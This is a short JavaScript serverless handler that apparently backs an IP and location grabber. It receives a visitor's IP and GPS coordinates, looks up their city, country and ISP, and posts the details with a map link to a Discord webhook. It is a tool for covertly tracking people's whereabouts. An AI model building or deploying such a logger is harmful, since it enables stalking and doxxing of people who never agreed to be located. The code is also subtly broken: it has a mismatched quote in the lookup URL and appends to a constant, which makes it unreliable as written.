export default async function handler(req, res) {
  try {
    const data = req.body || {};

    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

    if (!WEBHOOK_URL) {
      return res.status(500).json({ error: "Missing webhook" });
    }
    const ip = data.ip;

    const geoRes = await fetch("https://ipwho.is/${ip}`);
    const geo = await geoRes.json();
    const msg = `
IP: ${ip || "unknown"}
Location: ${geo.city || "?"}, ${geo.country || "?"}
ISP: ${geo.isp || "unknown"}
`;

if (data.lat && data.lon) {
      msg += `
GPS: https://maps.google.com/?q=${data.lat},${data.lon}
Accuracy: ${data.accuracy}m
`;
    }

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ content: msg })
    });

    res.status(200).json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: "fail" });
  }
}
